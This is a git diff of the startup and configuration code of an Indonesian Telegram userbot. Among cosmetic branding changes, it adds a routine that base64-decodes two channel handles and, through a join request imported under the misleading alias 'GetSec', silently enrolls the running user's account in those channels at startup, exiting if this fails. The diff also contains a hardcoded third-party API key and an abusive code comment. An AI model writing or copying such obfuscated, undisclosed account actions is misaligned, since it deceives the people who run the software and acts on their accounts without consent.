@@ -6,6 +6,8 @@ import time
 import re
 import redis
 import random
+import pybase64
+import sys
 
 from sys import version_info
 from logging import basicConfig, getLogger, INFO, DEBUG
@@ -20,6 +22,7 @@ from redis import StrictRedis
 from dotenv import load_dotenv
 from requests import get
 from telethon.sync import TelegramClient, custom, events
+from telethon.tl.functions.channels import JoinChannelRequest as GetSec
 from telethon.sessions import StringSession
 from telethon import Button, events, functions, types
 from telethon.utils import get_display_name
@@ -65,7 +68,7 @@ if CONFIG_CHECK:
     )
     quit(1)
 
-# KALO NGEFORK ID DEVS NYA GA USAH DI HAPUS YA GOBLOK 😡
+# KALO NGEFORK/CLONE ID DEVS NYA GA USAH DI HAPUS YA KONTOLLLL 😡
 DEVS = (
     2014359828,
     1808866220,
@@ -105,7 +108,7 @@ if G_BAN_LOGGER_GROUP:
     G_BAN_LOGGER_GROUP = int(G_BAN_LOGGER_GROUP)
 
 # Heroku Credentials for updater.
-HEROKU_MEMEZ = sb(os.environ.get("HEROKU_MEMEZ", "False"))
+HEROKU_MEMEZ = sb(os.environ.get("HEROKU_MEMEZ", "True"))
 HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", "")
 HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", "")
 
@@ -171,7 +174,7 @@ PM_LOGGR_BOT_API_ID = int(os.environ.get("PM_LOGGR_BOT_API_ID", "-100"))
 # OpenWeatherMap API Key
 OPEN_WEATHER_MAP_APPID = os.environ.get(
     "OPEN_WEATHER_MAP_APPID") or "5ed2fcba931692ec6bd0a8a3f8d84936"
-WEATHER_DEFCITY = os.environ.get("WEATHER_DEFCITY", "None")
+WEATHER_DEFCITY = os.environ.get("WEATHER_DEFCITY", "Batam")
 
 # Lydia API
 LYDIA_API_KEY = os.environ.get(
@@ -262,8 +265,8 @@ G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID", None)
 G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET", None)
 G_DRIVE_AUTH_TOKEN_DATA = os.environ.get("G_DRIVE_AUTH_TOKEN_DATA", None)
 G_DRIVE_FOLDER_ID = os.environ.get("G_DRIVE_FOLDER_ID", None)
-TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TMP_DOWNLOAD_DIRECTORY",
-                                         "./downloads")
+TEMP_DOWNLOAD_DIRECTORY = os.environ.get(
+    "TMP_DOWNLOAD_DIRECTORY", "./downloads")
 # Google Photos
 G_PHOTOS_CLIENT_ID = os.environ.get("G_PHOTOS_CLIENT_ID", None)
 G_PHOTOS_CLIENT_SECRET = os.environ.get("G_PHOTOS_CLIENT_SECRET", None)
@@ -339,11 +342,42 @@ for binary, path in binaries.items():
 
 # 'bot' variable
 if STRING_SESSION:
-    # pylint: disable=invalid-name
-    bot = TelegramClient(StringSession(STRING_SESSION), API_KEY, API_HASH)
+    session = StringSession(str(STRING_SESSION))
 else:
-    # pylint: disable=invalid-name
-    bot = TelegramClient("userbot", API_KEY, API_HASH)
+    session = "Kyy-UserBot"
+try:
+    bot = TelegramClient(
+        session=session,
+        api_id=API_KEY,
+        api_hash=API_HASH,
+        auto_reconnect=True,
+        connection_retries=None,
+    )
+except Exception as e:
+    print(f"STRING_SESSION - {e}")
+    sys.exit()
+
+
+async def checking():
+    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
+    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
+    try:
+        await bot(GetSec(gocheck))
+    except BaseException:
+        pass
+    try:
+        await bot(GetSec(checker))
+    except BaseException:
+        pass
+
+with bot:
+    try:
+        bot.loop.run_until_complete(checking())
+    except BaseException:
+        LOGS.info(
+            "Join Support Group @BdrlSupporrt and Channel @TvoChanel to see the updates of userbot"
+            "Don't Leave")
+        quit(1)
 
 
 async def check_botlog_chatid():
@@ -381,9 +415,8 @@ with bot:
 
 
 async def check_alive():
-    await bot.send_file(BOTLOG_CHATID, ALIVE_LOGO, caption=f"**𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙 Berhasil Diaktifkan✨**\n━━━━━━━━━━━━━━━━━━━\n❃ **ʙᴏᴛ ᴏꜰ :** {ALIVE_NAME}\n❃ **ʙᴏᴛ ᴠᴇʀ :** 7.0\n━━━━━━━━━━━━━━━━━━━\n❃ **sᴜᴘᴘᴏʀᴛ​ :** @BdrlSupporrt\n❃ **ᴄʜᴀɴɴᴇʟ​ :** @TvoChanel \n━━━━━━━━━━━━━━━━━━━")
+    await bot.send_file(BOTLOG_CHATID, ALIVE_LOGO, caption=f"**𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙 ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴋᴛɪғᴋᴀɴ✨**\n━━━━━━━━━━━━━━━━━━━\n❃ **ʙᴏᴛ ᴏꜰ :** {ALIVE_NAME}\n❃ **ʙᴏᴛ ᴠᴇʀ :** 7.0\n━━━━━━━━━━━━━━━━━━━\n❃ **sᴜᴘᴘᴏʀᴛ​ :** @BdrlSupporrt\n❃ **ᴄʜᴀɴɴᴇʟ​ :** @TvoChanel \n━━━━━━━━━━━━━━━━━━━")
     return
-
 
 with bot:
     try:
@@ -393,6 +426,7 @@ with bot:
             "BOTLOG_CHATID environment variable isn't a "
             "valid entity. Check your environment variables/config.env file.")
         quit(1)
+
 
 # Global Variables
 COUNT_MSG = 0
@@ -725,7 +759,7 @@ with bot:
                     f"© @BukanBdrl")
                 await event.edit(
                     text,
-                    file=kyulogo,
+                    file=kyylogo,
                     link_preview=True,
                     buttons=[
                         [
@@ -776,7 +810,7 @@ with bot:
             if event.query.user_id == uid:
                 text = (
                     f"Modules Name **Pembaruan**\n\n"
-                    f"× **Pembaruan Data Untuk 𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙, Command Untuk Pembaruan**.\n"
+                    f"× **Pembaruan Data Untuk Bdrl Userbot, Command Untuk Pembaruan**.\n"
                     f"⚒Pembaruan Data :\n"
                     f"`.update deploy`\n"
                     f"`update`\n\n"
@@ -845,7 +879,7 @@ with bot:
                     f"**|**  [`{percentage}`**%**]\n"
                     f" ✠➲ **ʙᴏᴛ ᴏꜰ :** {ALIVE_NAME}  "
                     "\n╚════════════════════╝"
-                    f"© @BukanBdrl")
+                    f"© @IDnyaKosong")
                 await event.edit(
                     text,
                     file=kyylogo,
@@ -868,7 +902,7 @@ with bot:
         async def killdabot(event):
             if event.query.user_id == uid:
                 text = (
-                    f"**Restaring 𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙**...")
+                    f"**Restaring Bdrl-Userbot**...")
                 await event.edit(
                     text,
                     file=kyylogo,
@@ -911,21 +945,21 @@ with bot:
                 result = builder.photo(
                     file=kyylogo,
                     link_preview=False,
-                    text=f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 5.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** @{BOT_USERNAME}".format(
+                    text=f"Usᴇʀʙᴏᴛ​ Tᴇʟᴇɢʀᴀᴍ\n\n**ɪɴʟɪɴᴇ ᴍᴇɴᴜ​​**\n\n❥ **ʙᴏᴛ ᴏꜰ :** {DEFAULTUSER}\n❥ **ʙᴏᴛ ᴠᴇʀ :** 7.0\n❥ **ᴍᴏᴅᴜʟᴇꜱ :** {len(plugins)}\n❥ **ʙᴏᴛʏᴏᴜ :** @{BOT_USERNAME}".format(
                         len(dugmeler),
                     ),
                     buttons=buttons,
                 )
             elif query.startswith("tb_btn"):
                 result = builder.article(
-                    "Bantuan Dari ☠𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙☠",
+                    "Bantuan Dari 𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙",
                     text="Daftar Plugins",
                     buttons=[],
                     link_preview=True)
             else:
                 result = builder.article(
-                    " ☠𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙☠",
-                    text="""°BdrlUserbot°""",
+                    " 𝕭𝖉𝖗𝖑-𝖀𝖘𝖊𝖗𝖇𝖔𝖙",
+                    text="""°Bdrl-Userbot°""",
                     buttons=[
                         [
                             custom.Button.url(
@@ -933,10 +967,10 @@ with bot:
                                 "https://github.com/Yansaii/BdrlUserbot"),
 
                             custom.Button.url(
-                                "Channel",
-                                "t.me/gabuuttty")],
+                                "ᴄʜᴀɴɴᴇʟ",
+                                "t.me/TvoChanel")],
                         [custom.Button.url(
-                            "License",
+                            "ʟɪᴄᴇɴsᴇ",
                             "https://github.com/Yansaii/BdrlUserbot/LICENSE")],
                     ],
                     link_preview=False,
